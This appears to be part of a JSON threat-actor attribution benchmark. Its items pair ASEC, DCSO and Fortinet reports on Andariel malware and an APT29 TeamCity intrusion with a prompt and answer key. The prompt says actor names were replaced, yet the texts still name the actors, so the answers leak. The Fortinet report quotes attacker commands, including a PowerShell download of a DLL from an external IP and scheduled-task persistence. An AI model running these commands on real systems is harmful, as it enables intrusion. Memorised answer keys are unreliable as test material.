        "Text": "Analysis of Andariel’s New Attack Activities\nThe Andariel threat group which usually targets Korean corporations and organizations is known to be affiliated with the Lazarus threat group or one of its subsidiaries. Attacks against Korean targets have been identified since 2008. Major target industries are those related to national security such as national defense, political organizations, shipbuilding, energy, and communications. Various other companies and institutes in Korea including universities, logistics, and ICT companies are also becoming attack targets. [1] (this report only supports the Korean version)\nDuring the initial compromise stage, the Andariel threat group usually employs spear phishing, watering hole, and supply chain attacks. Additionally, there are cases where the group abuses central management solutions during the malware installation process. [2] A notable fact about the group is its creation and use of various malware types in its attacks. There are many backdoor types, including Andarat, Andaratm, Phandoor, and Rifdoor used in the past attacks, as well as TigerRAT [3] and MagicRAT [4] which have been detected for the past few years.\nAhnLab Security Emergency response Center (ASEC) is continuously monitoring the attacks of the Andariel threat group. This blog post will cover details surrounding the recently identified attacks deemed to be perpetrated by the Andariel group. Note that because the malware strains and C&C servers identified in past attack cases were not used in the aforementioned attacks, there is no direct connection. Thus, in order to identify the connection between the recent attacks and the Andariel threat group, this post will first analyze the cases of attacks by the Andariel group in the first half of 2023. Then the analysis will be used to identify the possible link between the attacks and the threat group. Details confirmed in the past attack cases will be included if necessary.\nOne characteristic of the attacks identified in 2023 is that there are numerous malware strains developed in the Go language. In an attack case where Innorix Agent was used, a Reverse Shell developed in Go was used. Black RAT was used in attacks targeting Korean companies afterward. Such trends continued into the recent cases, where other malware strains developed in Go such as Goat RAT and DurianBeacon are being used in attacks. Besides the Go version, DurianBeacon has a version developed in the Rust language as well.\n\nBecause the initial distribution case could not be identified directly, this post will conduct an analysis based on the malware strains used in the attacks. Note that various malware types are being used in the attacks. When a name given by the malware creator can be confirmed, the said name will be used. If not, the names of similar malware types or AhnLab’s detection name will be used.\n1. Past attack cases\n1.1. Cases of Innorix Agent abuse\nIn February 2023, ASEC shared the case where the Andariel threat group distributed malware to users with a vulnerable version of Innorix Agent in the blog post “Distribution of Malware Exploiting Vulnerable Innorix: Andariel.” [5] The Innorix Agent program abused in distribution is a file transfer solution client program. According to the post regarding the vulnerability by the Korea Internet & Security Agency (KISA), the affected versions were found to be INNORIX Agent 9.2.18.450 or earlier, which were advised to be applied with the security update. [6] (this content only supports the Korean version)\n\nAn investigation of the malware strains used in the attacks based on past attack cases revealed that multiple Korean universities were infected with malware strains. Most malware types used in the attacks were backdoors, and no previously identified type was present. However, because there is a connection with other malware strains used in the past or those used in subsequent attacks, a brief summary of their characteristics will be given.\n1.1.1. NukeSped variant – Volgmer\nAs covered in the ASEC Blog before, this malware strain uses the following 0x10 byte key in the process of communicating with the C&C server to encrypt packets. The key value in question is the same as the one employed in Volgmer used by the Hidden Cobra (Lazarus) threat group, as stated in a report by the United States Cybersecurity & Infrastructure Security Agency (CISA). [7] (page currently unavailable)\n•\tKey: 74 61 51 04 77 32 54 45 89 95 12 52 12 02 32 73\nVolgmer was also used in comparatively recent attacks. It runs by reading the configuration data saved in the registry key “HKLM\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Security” and uses the HTTP protocol to communicate with the C&C server. Such characteristics are highly similar to the type mentioned in the CISA report in the past, which means that the malware continues to be used in attacks with no significant variants being released. While the same key value was used in both the malware mentioned in this post and Volgmer, there is a difference: the malware used in the current attack cases uses the key value to encrypt the packets used to communicate with the C&C server. Meanwhile, Volgmer uses the value to decrypt the encrypted configuration data saved in the registry.\nAccordingly, it is not entirely accurate to categorize the above malware strain as a type of Volgmer, so it was categorized as a variant of NukeSped instead. The malware is a comparatively simple backdoor that only provides basic features. Notably, the Batch script used in the self-deletion process is similar to the one used in NukeSped types in the past.\n \n\n1.1.2. Andardoor\nDeveloped in .NET, this malware is a backdoor that uses the name TestProgram. Based on AhnLab’s detection name, it is classified as Andardoor. It is notable for being obfuscated using the Dotfuscator tool. It offers various features for controlling the infected system, such as file and process tasks, executing commands, and capturing screenshots. SSL encryption is used for communication with the C&C server. For the server name, it designated the “clientName” string.\n\n1.1.3. 1th Troy Reverse Shell\n1th Troy is a Reverse Shell malware developed in Go. The following string included in the binary shows that the malware has the simple name of “Reverse_Base64_Pipe” and the malware’s creator classified the malware as “1th Troy”.\nG://Code//01__1th Troy//Go/Reverse_Base64_Pipe//Client//client.go\nBeing a Reverse Shell that only provides basic commands, the commands supported include “cmd”, “exit”, and “self delete”. They support the command execution, process termination, and self-deletion features respectively.\n\n1.2. Cases of attacks against Korean corporations\nThe Andariel group also distributed malware in March 2023 in its attacks against the Korean defense industry and an electronics device manufacturer. The method of initial compromise has not yet been identified, but logs of the mshta.exe process installing TigerRat and the mshta.exe process being terminated were confirmed through the AhnLab Smart Defense (ASD) infrastructure. This means that the malware strains were installed through a script-type malware with the spear phishing attack method.\n\nMalware strains used in attacks were generally backdoor types. TigerRat, which has been used by the Andariel group since the past, was also included.\n1.2.1. TigerRat\nTiger Rat is a RAT-type malware with its name given by KISA [8] and has been consistently employed by the Andariel threat group since 2020. It is known to be generally distributed through malicious document files containing macros that are attached to spear phishing emails, or through watering hole attacks. [9] There are also cases where the Andariel group targeted Korean corporations that use vulnerable versions of VMware Horizon and launched Log4Shell vulnerability attacks to install TigerRat. [10]\nBesides offering basic features such as file tasks and executing commands, TigerRat is a backdoor that supports other various features such as collecting information, keylogging, capturing screenshots, and port forwarding. One of its characteristics is that there is an authentication process upon the first communication session with the C&C server. In past versions, the string shown below disguised as SSL communications was used in the authentication process. Depending on the malware version, either the string “HTTP 1.1 /member.php SSL3.4” or “HTTP 1.1 /index.php?member=sbi2009 SSL3.3.7” must be sent to the C&C server, and the string “HTTP 1.1 200 OK SSL2.1” should be sent in return for authentication to be successful.\n\nHowever, in the recently identified TigerRat type, the following random strings 0x20 in size are used. These strings are thought to be the MD5 hash for “fool” (dd7b696b96434d2bf07b34f9c125d51d) and “iwan” (01ccce480c60fcdb67b54f4509ffdb56). It seems that the threat actor used random strings in the authentication process to evade network detection.\n\n•\tC&C request string: dd7b696b96434d2bf07b34f9c125d51d\n•\tC&C response string: 01ccce480c60fcdb67b54f4509ffdb56\n1.2.2. Black RAT\nBlack Rat is a backdoor-type malware that is likely created by the threat actor. Like other malware strains, it was developed in Go. While the 1th Troy Reverse Shell identified in the previous case only supports a basic command execution feature, Black Rat provides many additional features such as downloading files and capturing screenshots.\n \nExamining the following string included in the binary shows that the malware creator classified the malware as a RAT type and named it Black.\nI:/01___Tools/02__RAT/Black/Client_Go/Client.go\n1.2.3. NukeSped variants\nA typical NukeSped-type backdoor was also used in this attack. Supported features include network scanning, process and file lookup, file upload/download, and command execution. The names of the APIs to be used are encrypted as shown below. These are decrypted and the API names are taken from somewhere else. A key with a size of 0x26 is used for decryption.\n\n•\tKey value used for decryption: i<6fu>-0|HSLRCqd.xHqMB]4H#axZ%5!5!?SQ&\nThis NukeSped variant also uses a Batch script for self-deletion, but it is slightly different from the one used in the previous attacks.\n\nThere are two types of identified NukeSped variants: Reverse Shell and Bind Shell types. Both listen to port number 10443. This NukeSped variant has an authentication process before communicating with the C&C server like TigerRat. Yet whereas TigerRat disguised the process as SSL communications, NukeSped disguised it as HTTP communications. Thus, after sending the following POST request, an accurately matching HTTP response must be received for the malware to commence communications with the C&C server.\n\n2. Cases of Recent Attacks\nASEC is monitoring attacks of the Andariel group and has recently identified cases of Innorix Agent being abused to install malware. Unlike past cases where Innorix Agent was downloading malware strains, the recent case directly creates the malware file, so it is not certain whether the attacks are vulnerability attacks or if Innorix Agent was simply abused.\nMalware strains identified in these attacks are not those that had been used by the Andariel group in the past, but aside from the fact that Innorix was used in the attacks, the current attack is similar to past attack cases in that the attack targets are Korean universities. While the attack was being perpetrated, attack cases against Korean ICT companies, electronic device manufacturers, the shipbuilding industry, and the manufacturing industry were identified as well. Analysis showed that there was a connection with the malware strains used in attack cases where Innorix was abused.\nThis part will analyze each attack case and malware strains used in the attacks. Afterward, a summary will be given of the conclusion that the same threat actor is behind these attacks and the basis behind the claim, as well as the relationship between the current attacks and past attack cases of the Andariel threat group.\n2.1. Cases of Innorix Agent abuse\n2.1.1. Goat RAT\nIn recent attacks against Korean universities, there were cases where Innorix Agent installed malware strains. Innorix Agent installed the malware strains under the name “iexplorer.exe”. This is one of the names that has been often used by the Andariel group.\n\nE:/Projects/Malware/6_Goat_23/Goat/Goat.go\nE:/Projects/Malware/6_Goat_23/Goat/define.go\nE:/Projects/Malware/6_Goat_23/Goat/anti-vaccine.go\nE:/Projects/Malware/6_Goat_23/Goat/command.go\nAlthough the recent version is obfuscated unlike the Go-based backdoor-type malware used in past attacks, basic file tasks, self-deletion features, etc. can be identified. There are also logs where the following commands were executed.\n> cmd /c tasklist\n> cmd /c ipconfig /all\n\n2.2. Cases of attacks against Korean corporations\n2.2.1. AndarLoader\nAside from the attack cases where Innorix Agent was abused, ASEC identified another type of attack in a similar period of time. While the initial distribution route has not yet been ascertained, the malware strains used in the attacks were obfuscated with a tool called Dotfuscator like the .NET malware strains classified as Andardoor. Another common trait is that both types use SSL communications with the C&C server. Unlike Andardoor which used “clientName” when connecting to the C&C server, this attack case used the string “sslClient”.\n\nWhereas Andardoor had most of its features already implemented, this malware strain only has a downloader feature to download and execute executable data such as .NET assemblies from external sources. Out of the commands sent from the C&C server, the commands shown below can be used to execute or terminate the received code. Behaviors performed by the threat actor using AndarLoader include installing Mimikatz in the infected system, which has been confirmed through a recorded log.\nAt the time of analysis, the C&C server was unavailable for access and the part in charge of the actual features could not be investigated, so no direct similarity with Andardoor could be confirmed. However, the use of the same obfuscation tool or the similarities in the communication process with the C&C server led AhnLab to categorize this malware as the AndarLoader type.\nTable 1. List of commands that can be executed\nAmong the commands given by the treat actor that AndarLoader executes, there is a command to terminate the mshta.exe process. The fact that AndarLoader was installed via PowerShell and the mshta.exe process was involved leaves the possibility that this is a spear phishing attack like the cases of attacks covered above.\n\nAdditionally, logs of the mshta.exe process connecting to the C&C server can be found in systems infected with AndarLoader.\n\nThe domain kro.kr was used as the C&C and download URLs. This is a domain generally used by the Kimsuky threat group. Also, the fact that Ngrok was installed for RDP connection during the attack process shows how the case is similar to the attack pattern of the Kimsuky group.\n\n2.2.2. DurianBeacon\nWhile investigating the AndarLoader malware, AhnLab identified that a malware strain named DurianBeacon was also used in the attack process. There are two versions of DurianBeacon, one developed in Go and the other developed in Rust. Both are backdoors that can perform malicious behaviors by receiving the threat actor’s commands from the C&C server.\nA. Go Version\nExamining the following strings included in the binary indicates that the malware creator named this malware strain DurianBeacon.\nG:/Dev/Go/DurianBeacon/Command.go\nG:/Dev/Go/DurianBeacon/SSL.go\nG:/Dev/Go/DurianBeacon/Utils.go\nG:/Dev/Go/DurianBeacon/main.go\nThe Go version of DurianBeacon uses the SSL protocol to communicate with the C&C server. After initial access, it sends the infected system’s IP information, user name, desktop name, architecture, and file names before awaiting commands. When a command is sent, it returns a result. Supported features besides collecting basic information about the infected system include file download/upload, lookup, and command execution features.\n\nBecause the SSL protocol is used, communications packets are encrypted. The following packet structure is used internally.\nTable 2. Command packet structure of DurianBeacon\nThe features corresponding to each command code are as follows.\nTable 3. List of DurianBeacon commands\nAfter executing commands, the malware sends the success status or the command execution results to the threat actor’s C&C server. The response is also similar to the command packet.\nTable 4. Structure of the DurianBeacon response packet\nTable 5. DurianBeacon’s response list\nB. Rust Version\nInvestigation of related files revealed that the Rust version of DurianBeacon was also used in attacks.\n•\tPDB information: C:\\Users\\Anna\\Documents\\DurianBeacon\\target\\x86_64-pc-windows-msvc\\release\\deps\\DurianBeacon.pdb\nDurianBeacon supports packet encryption using XOR aside from SSL to communicate with the C&C server, using the key 0x57.\n\nThe packet structure and commands are also the same as the Go version. The Rust version of DurianBeacon sends the keyword “durian2023” alongside the infected system’s IP information, user name, desktop name, architecture, and file names before awaiting command. When a command is sent, it returns the results.\n\n3. Connections to recent attack cases\nThe above section covered the recently identified two cases where universities in Korea were attacked through abusing Innorix Agent and where malware strains were installed in Korean corporations through presumably spear phishing attacks. This part will explain why AhnLab considers the same threat actor to be behind both types of attacks.\nFirst, there are cases in AhnLab’s ASD logs where Durian, Goat RAT, and AndarLoader were collected together in a similar period. The system in question is thought to be the threat actor’s test PC because the path name of AndarLoader was as follows.\n•\tAndarLoader collection path: d:\u0001__developing\\99__c#_obfuscated\runtime broker.exe\nThere are also cases where the C&C servers of backdoor-type malware strains were the same. When the threat actor used Innorix Agent to install malware, Goat RAT was mainly employed, but there is a significant portion where other malware strains were installed. While such malware samples could not be collected, there are recorded communications logs with the C&C server. Also, the URL in question was the same as the DurianBeacon C&C server URL used in other attacks.\n\nFinally, there was a log where DurianBeacon installed AndarLoader. This means that these attacks happened around a similar time period, and the attacks might be related to each other as the installation processes and the C&C server URLs used tend to be similar.\n\n4. Connections to past attack cases of the Andariel group\nThe recently identified two attack cases are likely done by the same threat actor. This section will cover the relationship between these attacks and the Andariel threat group.\nA. Attack Targets\n•\tAttacked universities, the national defense industry, electronic device manufacturers, ICT companies, etc. in Korea.\nB. Attack Methods\n•\tAbused Innorix Agent like in past cases\n•\tProbably employed spear phishing method like in past cases\n•\tSimilarities between the path and file names used when installing the malware strains\nC. Malware Types Used\n•\tMalware strains developed in Go were used\n•\tSimilarities between Andardoor and AndarLoader\n•\tMalware types similar to the Infostealer used in previous attacks were identified\nFirst, there are the facts that the industries and sectors that became attack targets were the same as the targets identified in past attack cases and the same attack methods used in previous attacks were employed in recent cases. AhnLab identified cases where Innorix Agent was used. While not confirmed, many logs showed circumstances of spear phishing attacks.\nThe file name “iexplorer.exe” used to install malware has been identified from Andariel’s past attack cases to the present. Besides “iexplorer.exe”, names including the “svc” keyword such as “authsvc.exe” and “creditsvc.exe” has been continuously used. Also, aside from “mainsvc.exe” and “certsvc.exe”, there are cases where similar names such as “netsvc.exe” and “srvcredit.exe” were used.\nAs covered in the corresponding section, AndarLoader was obfuscated with the trial version of Dotfuscator, the tool used in Andardoor in previous attacks. It also uses SSL encryption to communicate with the C&C server, again showing similarities with past attack cases. Two other malware strains developed in Go were used as well. These align with the trend of malware strains developed in Go such as 1th Troy Reverse Shell and Black RAT continuously being used since the early part of this year.\nFinally, there is also the system thought to be the threat actor’s test PC and Infostealer strains presumably created by the threat actor during the attack process. In fact, the Andariel group in the past installed malware strains responsible for stealing account credentials during the attack process, exfiltrating account credentials saved in Internet Explorer, Chrome, and Firefox web browsers. Such malware strains are command line tools that output the extracted account credentials via command lines. It seems that the threat actor used a backdoor to send the results to the C&C server.\n\nThe Infostealer used in the recent attacks has a similar format. The only difference is that it only targets web browsers and steals account credentials and histories. Additionally, unlike the past cases where results were outputted by command lines, the recent version saves the stolen information in the same path under the file name “error.log”.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Andariel"
    },
    {
        "url": "https://medium.com/@DCSO_CyTec/andariels-jupiter-malware-and-the-case-of-the-curious-c2-dbfe29f57499",
        "Text": "Since 2020 DCSO has been monitoring a publicly undocumented malware family attributed to the Andariel group, a subgroup of the infamous North Korean Lazarus Group. The malware family has remained largely unchanged over the years and only made few appearances.\nIn early 2023 however, one such appearance seemed particularly noteworthy as the configured Command & Control suggests that the attackers have managed to compromise the web presence of the National Institute of Virology in India and possibly used it to control computers infected with the malware family.\nIn this blog post, we document the malware and discuss how this finding fits the attacker profile.\nBlog authored by Johann Aydinbas, Emilia Neuber, Kritika Roy, Axel Wauer, Jiro Minier and colleagues.\nBasic case information\nIn 2020, DCSO first came across an unknown malware family uploaded to VirusTotal. During our analysis we discovered that we weren’t the first to notice — we believe it to belong to the malware family dubbed “Jupiter” by BAE Systems, and attributed to the Andariel group.\nInterestingly, the malware is written in PureBasic, a programming language that’s rarely used in malware creation (however, exceptions do exist). While the choice of programming language is rather exotic, the malware itself only offers basic download and shell command execution capabilities.\nWe then added custom rules for this family to our monitoring. Around a year later the rule produced another hit (the “OSPREY sample”, based on its code signature by “OSPREY VIDEO, INC.”) which we could attribute to a targeted attack attempt against a German medical/pharma company.\n\nThe malware family then disappeared from our radar, producing no hits in all of 2022. In the beginning of February 2023 however, it resurfaced in CISA’s AA23–040A alert (the “CISA sample”) hidden away in the IoCs related to the H0lygh0st ransomware, which is assessed to be of DPRK origin.\n\nThe “CISA sample” found in the IoCs of CISA’s AA23–040A alert\nAnalysis of the “CISA sample” revealed it to likely be older, with the timestamps dating it to 2021, the same year as the “OSPREY sample”. Then, a few weeks later our monitoring finally detected another sample and this time it appeared to be a fresh catch too, with timestamps indicating a compile time in mid January 2023.\nThe new sample, functionally unchanged, contained a very interesting Command & Control server, suggesting that the threat actors behind it might have managed to compromise the web server for the National Institute of Virology of India, or NIV in short, a designated BSL-4 research center authorized to test highly contagious viruses impacting humans.\nAt the time of finding the sample, we were unable to receive actual commands from the configured C2 so it remains inconclusive if the compromise took place. However, the configured path does closely resemble another path that we believe was used by the real web page at some point — further indicating that a compromise took place and was intentionally chosen to blend in:\n\nFor similar attacks it is also documented that commands are closely guarded and only issued to requests coming from expected source IPs, typically returning 404 for anyone else in order to keep a low profile.\nBackground\nSo while we do not have definite proof of a compromise, DPRK actors targeting the NIV (either as the intended target or in order to attack other targets in the general nexus of the NIV such as other medical companies) would fit the attacker profile very well.\nDPRK actors and India\nDPRK actors targeting India is not new either. North Korea-linked threat actors have continued to target public and private sectors in India with a broad-based victimology including a space agency, a nuclear power plant, as well as the energy sector and medical research previously. Campaigns against strategically sensitive targets have mostly been motivated by the need to siphon-off sensitive information.\nThe healthcare and medical research sector has been continuously targeted by DPRK threat actors with a significantly increased tempo during the COVID-19 pandemic. In 2020, suspected North Korean hackers tried to break into various healthcare companies, likely for intelligence gathering and espionage purposes, including Oxford’s AstraZeneca. Additionally, Microsoft reported that North Korean ZINC and Cerium have taken aim at multiple healthcare entities, including vaccine makers and COVID test developers. Furthermore, South Korean intelligence suspected that North Korea attempted to steal the COVID-19 vaccine from Pfizer in February 2021.\nThe DPRK and COVID-19\nThe outbreak of the COVID-19 pandemic isolated the “hermit state” even further from the international community. Following the rapid spread of COVID-19 infections in China, North Korea shut down any cross-border exchanges in January 2020, which has largely been maintained ever since. In August 2022, Kim Jong-un announced that COVID-19 was eradicated. (According to state media reporting, only 74 people died between the first publicly disclosed case in April and August 2022.) However, Pyongyang again saw a rising numbers of “respiratory illness” in January 2023, leading to a 5-day lockdown in the capital indicating that North Korea still continues to struggle with COVID-19 infections.\nSo far, Pyongyang has repeatedly turned down international offers for vaccines such as Russia’s Sputnik V in April 2021, offers by South Korea in May 2021, and three million doses of Chinese SINOVAC vaccines as part of a United Nations-backed COVAX initiative in September 2021. One year later, in September 2022, North Korea started its first vaccination campaign in border cities to China and Russia. Media reporting claimed they had received doses from China, probably SINOVAC, alongside other medical supplies to ensure an adequate health care provision.\nCountry-wide distribution of a vaccine poses a bigger challenge though. mRNA vaccines like Pfizer and Moderna require ultra-cold temperatures but the country’s existing cold chain distribution system is only designed for 2°C — 8°C. With the refusal of SINOVAC, Sputnik V and AstraZeneca, the state might thus be looking for alternatives. As such, the Indian vaccine COVAXIN may be of special interest, as COVAXIN is relatively easy to store, making it particularly attractive to lower and middle-income countries like North Korea.\nThe DPRK’s present COVID situation and the country’s vaccine supply restraints as well as previous patterns provide strong motive for targeting the NIV as a leading health research center with a focus on COVID. The NIV has played a crucial role in India’s fight against COVID-19 for example, being a forerunner in the areas of vaccine development, genome sequencing and testing supplies. The NIV has also been recognized by the WHO as “a collaborating centre for emerging and re-emerging infectious diseases.”\nTechnical Details\nInvestigating the Command & Control\nThe Command & Control projectcell.niv[.]co.in resolves to 173.249.33[.]80, which is allocated to German mass-hosting provider Contabo GmbH. No other FQDNs have been seen on this IP address thus far.\nniv[.]co.in, however, resolves to 173.249.44.87, also allocated to Contabo GmbH, and appears to be used as a mass-hosting web server by an Indian marketing and web development company, I Knowledge Factory (IKF). Perhaps unsurprisingly, a variety of legitimate domains resolve to it, all seemingly belonging to legitimate Indian entities. An IKF mail server is also used (through a CNAME) as an MX record for niv[.]co.in.\nIt remains unclear at the time of writing why IKF chose to host at least some of their customers’ infrastructure in Germany, far away (in both geographic and network terms) from their (presumed) main audience in the India vicinity.\nFurther, IKF’s nameserver setup struck us as odd, with the primary nameserver serving niv[.]co.in and others, ns.iknowledgefactory.com, resolving to 103.73.189.76 — allocated to Evoke Digital Solutions in India — while having its PTR DNS record set to email.lkf.in. This domain (note the similarity of “l” and “i”) however is currently available for sale, and does not seem to be under control of IKF anymore.\nAccording to niv[.]co.in’s SPF policy, any IP address projectcell.niv[.]co.in resolves to is explicitly permitted to emit e-mails for this domain. This includes 173.249.33[.]80, which DCSO assesses as likely being under control by Andariel.\nLastly, it has to be noted that the official website of the National Institute of Virology is niv.icmr.org.in, a fact also advertised on niv[.]co.in — which appears to have been abandoned by NIV or IKF commencing October 2022. Rather than letting previously used domains orphan or even expire, it is crucial to set up proper redirects to the new primary domain, and ensure the respective organization maintains control over its domain set all the time.\nMalware analysis\nThe malware itself is a basic loader. It can download files, execute shell commands and send back the console output.\nCommunication happens via HTTP which is manually implemented using socket functions, and as such it is not capable of communicating with HTTPS servers.\nThe client transfers data via POST requests, in which the data fields are encrypted using a simple rotating xor + base64.\n\nWe’ve identified the following fields:\nid=          Xor key\npage=        Status code (not encrypted)\nquery=       Basic client info\nrep0=        Shell command output\nThe page field contains basic client info, such as:\n10.0.0.1|DESKTOP-BI961TX|batman|110|64\nwhere the first field is a collection of local IP addresses, followed by the computer name, username, Windows version as well as bitness of the system.\nThe server then responds either with HTTP 504, which signals the bot to stop running, or HTTP 500 which may contain a command and/or download payload in the HTTP body.\nIn case of HTTP 500 (shell command and/or download task) the HTTP body adheres to the following format:\n[10 bytes unused]\n[8 bytes check string]\n[8 bytes xor key]\n[1 byte shell command length]\n[* shell command]\n[1 byte download target path length]\n[* download target path]\n[* download payload]\nAll fields following the xor key are encrypted with it using a simple rolling xor scheme.\nThe check string appears to be a magic 8 byte value the client verifies with a simple algorithm, which is satisfied by the following magic bytes:\n0b 15 1f 29 33 3d 47 51\nExample code of the check algorithm in Python:\nfor i in range(8):\n    assert(check_string[i] == ((i+1)*10+1))\nBased on this, we’ve created a Suricata rule which we’re distributing as part of the IoCs.\nIf a download target path is specified in the response, the malware will write the payload to the specified path and copy Explorer.exe’s timestamps to it in order to disguise the file. In case the downloaded file is an EXE file it will also pad the executable with 40,000,000 (~40MB) random bytes on disk, likely to exceed some security software’s file limits and/or generate a unique hashsum for downloaded binaries.\nIf a shell command is specified, the malware will execute the shell command, capture the output and send the contents back to the C2 using the rep0 POST request field.\n\n",
        "Prompt": "You are given a threat report that describes a cyber incident. Any direct mentions of the threat actor group, specific campaign names, or malware names responsible have been replaced with [PLACEHOLDER]. Your task is to analyze the report and attribute the incident to a known threat actor based on the techniques, tactics, procedures (TTPs), and any other relevant information described. Please provide the name of the threat actor you believe is responsible and briefly explain your reasoning.",
        "GT": "Andariel"
    },
    {
        "url": "https://www.fortinet.com/blog/threat-research/teamcity-intrusion-saga-apt29-suspected-exploiting-cve-2023-42793",
        "Text": "On September 6, 2023, researchers from Sonar discovered a critical TeamCity On-Premises vulnerability (CVE-2023-42793[1]) issue.[2] TeamCity is a build management and continuous integration server from JetBrains[3]. On September 27, 2023, a public exploit for this vulnerability was released by Rapid7[4]. This critical vulnerability was given a CVE score of 9.8, most likely because an attacker can deploy the publicly available exploit without authentication supporting remote code execution on the victim server using a basic web request to any accessible web server hosting the vulnerable application. This vulnerability has been observed being actively exploited in the wild and was added to CISA's 'Known Exploited Vulnerabilities Catalog' on October 4, 2023.[5]\nIn mid-October 2023, the FortiGuard Incident Response (IR) team sent a courtesy notification to an organization that had been compromised due to this vulnerability.  This organization engaged the FortiGuard IR team to investigate the malicious activity in their network.\nThe victim was a US-based organization in the biomedical manufacturing industry. Our subsequent investigation determined that initial access for the attack was through the exploitation of the CVE-2023-42793 TeamCity vulnerability using a custom-built exploit script written in Python. The behavior of the malware used in post-exploitation matches the GraphicalProton malware used by APT29. This article breaks down our investigation and the outcome of our containment, eradication, and remediation efforts. As part of this analysis, we look at threat actor TTPs employed throughout the intrusion and how they were identified and pieced together by the FortiGuard IR team. MITRE ATT&CK mapping and observables are provided at the end of the article, alongside IOCs and FortiEDR Threat Hunting queries, to assist with threat-hunting activities for similar behavior.\nSummary of Attack\n\nFigure 1: The attack timeline of TeamCity intrusion described in this article.\nAnalysis\nVulnerability Exploitation\nAs part of our initial customer engagement, we examined several EDR events reported from one of the victim's Windows application servers (HOST_1_TEAMCITY). During a scoping call, the FortiGuard IR team identified that one of the applications hosted on this server was TeamCity. The victim had only recently updated the application to a non-vulnerable version.\nWe began by retrieving application and system logs from the suspected compromised server (HOST_1_TEAMCITY). On analysis of the application logs, we identified significant evidence of successful exploitation of the TeamCity vulnerability. The authentication bypass can be observed in the screenshot of the teamcity-auth.log file, shown in Figure 2.\nFigure 2: A snippet of the 'teamcity-auth.log' screenshot highlighting the TeamCity exploit evidence and associated remote IP.\nAnalysis of these logs showed that this vulnerability had been exploited multiple times over a relatively short period, with connections originating from multiple unique public IP addresses. The teamcity-auth.log (authentication events log) identifies successful exploitation but does not provide details on commands executed through exploitation. This information is available in the separate 'teamcity-server.log' file, a general server log for the TeamCity software. Analyzing this log file around confirmed attempted remote code execution on the same host. For example, the IP address 167[.]179[.]75[.]213 taken from the highlighted log entry in Figure 2 was correlated with the echo command execution log highlighted in the 'teamcity-server.log' entry in Figure 3. Details of the external command execution from the 'teamcity-server.log file can also be seen in Figure 3.\nFigure 3: A snippet of the 'teamcity-server.log' showing remote code execution evidence, including the associated command executed through the exploitation.\nFurther analysis of the various commands executed on the vulnerable server through this RCE exploit led the IR team to believe multiple threat actors were conducting simultaneous operations. Some commands executed as part of this intrusion are shown in Table 1. \nLooking critically at some of the attempted commands, it appears that some of the threat actors successfully exploited the vulnerability but were unsuccessful at running Linux system commands on the victim Windows Server. An example of this behavior can be seen in Figure 4.\nFigure 4: TeamCity log showing attempted Linux command execution by a threat actor following successful vulnerability exploitation.\nIt appears that several of the commands from various remote IPs may have been associated with the use of the open-source vulnerability scanner Nuclei[6]. The IR team found a Nuclei template (CVE-2023-42793.yaml) designed to identify the presence of the TeamCity vulnerability in Nuclei's official template repository[7]. The yaml template file contains the following line:\nPOST /app/rest/debug/processes?exePath=echo&params={{randstr}} HTTP/1.1\nThe resulting request would produce an echo command on a successfully exploited TeamCity server, identical to the echo commands observed in the victims' TeamCity logs. The IR team collated information from both logs to better understand the correlations between when the echo commands were executed and the associated network connections from the numerous public IP addresses. A snippet of this correlation is shown in Figure 5, where the echo commands generated by some of the Nuclei scanning are also highlighted.\nFigure 5: A snippet of correlated logs showing network connections and subsequent commands. Highlighted are multiple echo commands indicative of likely Nuclei scanning.\nAt this stage of the intrusion, it became clear that multiple threat actors were scanning for the vulnerability, validating if it could be exploited, and attempting to establish a foothold using the related exploitation. The following section of this report focuses on the activities of one of these threat actors distinct from other threat actor activities. We will refer to this culprit as the 'main threat actor.' A description of the activities conducted by other threat actors exploiting this vulnerability is covered more extensively in the following 'Other Threat Actors Activity' section.\nMain Threat Actor Intrusion\nThe first activity attributed to the main threat actor was the execution of an echo command like those discussed above, indicating that the main threat actor likely employed Nuclei to identify potential victims. After this initial command, the main threat actor began executing additional discovery commands to gather system and privilege information. Some of these discovery commands are shown below:\ncmd.exe \"/c systeminfo\"\nwhoami\nipconfig /all\nwhoami /all\nThe command attributed to the Nuclei scanning, as well as these subsequent discovery commands, were linked to different remote IP addresses. However, we assessed them as being from the same actor due to the slight timeline difference of a few seconds between the activities. This indicates the main threat actor uses different infrastructures to scan for victims and execute later commands.\nOne command and control (C2) IP address discovered during our investigation was linked to a US-based tertiary education organization. Upon detection of this active exploitation, the FortiGuard IR team notified the organization that their infrastructure may have been compromised and part of an ongoing APT29 campaign. They performed an internal investigation and identified exploitation of their vulnerable TeamCity server associated with the previously identified IP address. As part of this exploitation, the main threat actor used the TeamCity exploit to install an SSH certificate, which they then used to maintain access in this second victim's environment. The organization's security team provided additional information to the FortiGuard IR team, who then identified that the source of the attack on the educational organization was a TOR exit node. This report does not include the victim’s details used as a relay to protect their identity. They have successfully remediated their environment and patched the associated vulnerability.\n After executing the discovery commands outlined above, the main threat actor attempted to download a DLL file, 'AclNumsInvertHost.dll,' on the TeamCity host using PowerShell and the 'Invoke-WebRequest' cmdlet. The actor used the following command to download the file:\npowershell -exec bypass -c \"Invoke-WebRequest -Uri\nhxxp[:]//103[.]76[.]128[.]34:8080/AclNumsInvertHost.dll -OutFile\nC:\\Windows\\System32\\AclNumsInvertHost.dll\"\nAfter successfully downloading this DLL file on the HOST_1_TEAMCITY, the main threat actor again used the TeamCity RCE vulnerability to create a Windows-scheduled task referencing this DLL file. They likely did this for persistence and to abstract their execution from the TeamCity exploitation. The actor used the following command to create the scheduled task:\nschtasks.exe /create /SC ONLOGON /tn\n\"\\Microsoft\\Windows\\DefenderUPDService\" /tr\n\"\\\"C:\\Windows\\system32v\rundll32.exe\"\n\\\"C:\\Windows\\system32\\AclNumsInvertHost.dll\\\",AclNumsInvertHost\"\nWe recovered the associated Windows task file from the victim TeamCity server (HOST_1_TEAMCITY), confirming that the command in the TeamCity log had been successfully executed and the scheduled task was created. The retrieved Windows task data is shown in Figure 6:\nFigure 6: Windows task created by threat actor for the persistence of a DLL file.\nAfter successfully creating the scheduled task, the actor attempted to execute the newly created task using the following command, again executed through the TeamCity RCE vulnerability on the HOST_1_TEAMCITY:\nschtasks.exe /run /tn \"\\Microsoft\\Windows\\DefenderUPDService\"\nAnalyzing the scheduled task and its method of creation, we noticed two 